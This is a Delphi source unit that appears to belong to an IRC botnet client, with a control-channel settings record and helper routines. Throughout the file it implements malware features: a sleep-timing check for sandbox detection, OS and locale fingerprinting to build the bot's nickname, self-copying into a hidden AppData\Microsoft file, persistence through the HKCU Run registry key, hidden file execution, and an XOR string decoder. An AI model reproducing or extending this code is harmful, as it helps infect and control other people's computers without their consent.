unit untFunctions;

interface

uses
  Windows,
  Winsock,
  ShellAPI,
  Registry,
  UrlMon,
  shfolder,
  ShlObj,
  SysUtils;

  {$I Settings.ini}

type
  TControlSetting = Record
    ControlNick         :String;
    ControlChannel      :String;
    ControlIdent        :String;
    ControlHost         :String;
  End;  

  Function fetchLocalName: String;
  Function fetchCurrent: String;
  Function fechLang: string;
  Function fetchOS: String;
  Function fetchRandom(intNumber: Integer): String;
  Function fetchIPfromDNS(szDNS: PChar): String;
  Function fetchHostFromIP(szIP: PChar): String;

  Function executeFile(szFilename: String; szParameters: String; bHidden: Boolean): Boolean;
  Function ReplaceShortcuts(szText: String): String;
  Function IsInSandBox: Boolean;
  Function IntToStr(Const Value: Integer): String;
  Function StrToInt(Const S: String): Integer;
  Function LowerCase(Const S: String): String;
  Function GetKBS(dByte: Integer): String;

  Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
  Procedure StartUp(EXE:string);
  Procedure Uninstall;

  Var
  DownloadDir: String;

implementation

(*      Function to calculate KB/s              *)
Function GetKBS(dByte: Integer): String;
Var
  dB    :Integer;
  dKB   :Integer;
  dMB   :Integer;
  dGB   :Integer;
  dT    :Integer;
Begin
  dB := dByte;
  dKB := 0;
  dMB := 0;
  dGB := 0;
  dT  := 1;

  While (dB > 1024) Do
  Begin
    Inc(dKB, 1);
    Dec(dB , 1024);
    dT := 1;
  End;

  While (dKB > 1024) Do
  Begin
    Inc(dMB, 1);
    Dec(dKB, 1024);
    dT := 2;
  End;

  While (dMB > 1024) Do
  Begin
    Inc(dGB, 1);
    Dec(dMB, 1024);
    dT := 3;
  End;

  Case dT Of
    1: Result := IntToStr(dKB) + '.' + Copy(IntToStr(dB ),1,2) + ' kb';
    2: Result := IntToStr(dMB) + '.' + Copy(IntToStr(dKB),1,2) + ' mb';
    3: Result := IntToStr(dGB) + '.' + Copy(IntToStr(dMB),1,2) + ' gb';
  End;
End;

(*      Function to make text lowercase         *)
Function LowerCase(Const S: String): String;
Var
  Ch    :Char;
  L     :Integer;
  Source:pChar;
  Dest  :pChar;
Begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest   := Pointer(Result);
  While (L <> 0) Do
  Begin
    Ch := Source^;
    If (Ch >= 'A') And (Ch <= 'Z') Then
      Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  End;
End;

(*      Function to resolve IP from DNS         *)
Function fetchIPfromDNS(szDNS: PChar): String;
Type
  TAddr = Array[0..100] Of PInAddr;
  PAddr = ^TAddr;

Var
  iLoop         :Integer;
  WSAData       :TWSAData;
  HostEnt       :PHostEnt;
  Addr          :PAddr;

Begin
  WSAStartUP($101, WSAData);
  Try
    HostEnt := GetHostByName(szDNS);
    If (HostEnt <> NIL) Then
    Begin
      Addr := PAddr(HostEnt^.h_addr_list);
      iLoop := 0;
      While (Addr^[iLoop] <> NIL) Do
      Begin
        Result := inet_nToa(Addr^[iLoop]^);
        Inc(iLoop);
      End;
    End;
  Except
    Result := '0.0.0.0';
  End;
  WSACleanUP();
End;

(*      Function to resolve Host from IP        *)
Function fetchHostFromIP(szIP: PChar): String;
Var
  SockAddrIn    :TSockAddrIn;
  HostEnt       :PHostEnt;
  WSAData       :TWSAData;

Begin
  WSAStartUP($101, WSAData);
  SockAddrIn.sin_addr.S_addr := inet_addr(szIP);
  HostEnt := GetHostByAddr(@SockAddrIn.sin_addr.S_addr, 4, AF_INET);
  If HostEnt <> NIL Then
    Result := String(HostEnt^.h_name)
  Else
    Result := '';
  WSACleanUP();
End;

(*      Function to Convert String to Integer   *)
Function StrToInt(Const S: String): Integer;
Var
  E: Integer;
Begin
  Val(S, Result, E);
End;

(*      Function to Convert Integer to String   *)
Function IntToStr(Const Value: Integer): String;
Var
  S: String[11];
Begin
  Str(Value, S);
  Result := S;
End;

(*      Function to determine if
        we are running in a sandbox             *)
Function IsInSandBox: Boolean;
Var
  TCount1       :Integer;
  TCount2       :Integer;
  TCount3       :Integer;
Begin
  Result := False;
  TCount1 := GetTickCount();
  Sleep(5000);
  TCount2 := GetTickCount();
  Sleep(5000);
  TCount3 := GetTickCount();
  If ((TCount2 - TCount1) < 5000) And
     ((TCount3 - TCount1) < 10000) Then
     Result := True;
End;

(*      Function to fetch Local Name            *)
Function fetchLocalName: String;
Var
  LocalHost     : Array [0..63] Of Char;
Begin
  GetHostName(LocalHost, SizeOf(LocalHost));
  Result := String(LocalHost);
End;

(*      Function to replace shortcuts           *)
Function ReplaceShortcuts(szText: String): String;
var
path:array[0..Max_Path] of Char;
string1:string;
Begin
  ReplaceStr('%os%', fetchOS, szText);
  ReplaceStr('%cc%', fechLang, szText);
  ReplaceStr('%rn%', fetchRandom(5), szText);
  //ReplaceStr('%ln%', fetchLocalName, szText);
  Result := '[NEW][' + fechLang + ']' + fetchRandom(5);
  ShGetSpecialFolderPath(0,path, CSIDL_WINDOWS, False);
  string1 := path + '\system32\';
  If fetchCurrent = string1 then Result := szText;
End;

(*      Function to generate a random number    *)
Function fetchRandom(intNumber: Integer): String;
Var
  I     :Integer;
Begin
  Randomize;
  Result := '';
  For I := 1 To intNumber Do
    Result := Result + IntToStr(Random(10));
End;

(*      Function to fetch language             *)
function fechLang: string;
Var
  IsValidCountryCode  :Boolean;
  CountryCode         :Array[0..4] of Char;
  Begin
  IsValidCountryCode := (3 = GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SISO3166CTRYNAME,CountryCode,SizeOf(CountryCode)));
    if IsValidCountryCode then
    Begin
  result := PChar(@CountryCode[0]);
  end;
end;

(*      Function to replace strings             *)
Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;

(*      Function to fetch Windows OS            *)
function fetchOS: String;
var
  PlatformId, VersionNumber: string;
  CSDVersion: String;
begin
  Result := 'UNK';
  CSDVersion := '';

  // Detect platform
  case Win32Platform of
    // Test for the Windows 95 product family
    VER_PLATFORM_WIN32_WINDOWS:
    begin
      if Win32MajorVersion = 4 then
        case Win32MinorVersion of
          0:  if (Length(Win32CSDVersion) > 0) and
                 (Win32CSDVersion[1] in ['B', 'C']) then
                PlatformId := '95R2'
              else
                PlatformId := '95';
          10: if (Length(Win32CSDVersion) > 0) and
                 (Win32CSDVersion[1] = 'A') then
                PlatformId := '98SE'
              else
                PlatformId := '98';
          90: PlatformId := 'ME';
        end
      else
        PlatformId := '9X';
    end;
    // Test for the Windows NT product family
    VER_PLATFORM_WIN32_NT:
    begin
      if Length(Win32CSDVersion) > 0 then CSDVersion := Win32CSDVersion;
      if Win32MajorVersion <= 4 then
        PlatformId := 'NT'
      else
        if Win32MajorVersion = 5 then
          case Win32MinorVersion of
            0: PlatformId := '2000';
            1: PlatformId := 'XP';
            2: PlatformId := '2K3';
          end
        else if (Win32MajorVersion = 6) and (Win32MinorVersion = 0) then
          PlatformId := 'VIS'
       else if (Win32MajorVersion = 6) and (win32minorversion = 1)then
          PlatformId := 'W7'
        else
          PlatformId := 'UNK';
    end;
  end;

    if (PlatformId = #0) and (CsdVersion = #0) then begin
  result := 'UNK';
  end;
  Result := PlatformId;
end;

(*      Function to add bot to startup            *)
procedure startup(EXE:string);
var
path:array[0..Max_Path] of Char;
string1:string;
myReg: TRegistry;
handle:Thandle;
begin
Handle := loadlibrary('Urlmon.dll'); // load the dll
ShGetSpecialFolderPath(0,path, CSIDL_APPDATA, False);
string1 := path + '\Microsoft\' + EXE;
DownloadDir := path + '\Microsoft\';
    
    if FileExists(string1) then begin
      deletefile(string1);
    end;
    
    copyFile(pchar(paramstr(0)),pchar(string1),false);
    
    if fileexists(string1) then begin
     SetFileAttributes(PChar(string1),FILE_ATTRIBUTE_HIDDEN);
    end;
    
    if paramstr(0) <> string1 then begin
     shellExecute(handle, 'open', pChar(string1), nil, nil, SW_SHOW);
     exitprocess(0);
    end;
  try
    myReg := TRegistry.Create;
    myReg.RootKey := HKEY_CURRENT_USER;

    if myReg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', TRUE) then
    begin
    myReg.WriteString(EXE, string1);
    end;
    finally
    myReg.Free;
    end;

end;

(*      Function to uninstall bot              *)
Procedure Uninstall;
var
myreg:Tregistry;
  begin
  try
    myReg := TRegistry.Create;
    myReg.RootKey := HKEY_CURRENT_USER;
    if myReg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run\', TRUE) then
    begin
      myreg.DeleteValue(bot_installname);
    end;
    finally
    myReg.Free;
  end;
end;

(*      Function to encrypt text              *)
function Decrypt(sInput:string; sKey:string):string;
var
iKey:     integer;
iInput:   integer;
Count:    integer;
i:        integer;
begin
  For Count := 1 to Length(sInput) do
  begin
    iInput := Ord(sInput[Count]);
    For i := 1 to Length(sKey) do
    begin
      iKey := iKey + Ord(sKey[i]) xor 10
    end;
    Result := Result + (Char(iInput xor iKey shr 3))
  end;
end;

(*      Function to execute a file              *)
Function executeFile(szFilename: String; szParameters: String; bHidden: Boolean): Boolean;
Begin
  Result := ShellExecute(0, 'open', pChar(szFileName), pChar(szParameters), NIL, Integer(bHidden)) > 32;
End;

(*      Function to fetch Current directory     *)
Function fetchCurrent: String;
Var
  Dir           :Array[0..255] Of Char;
Begin
  GetCurrentDirectory(256, Dir);
  Result := String(Dir) + '\';
End;

end.
 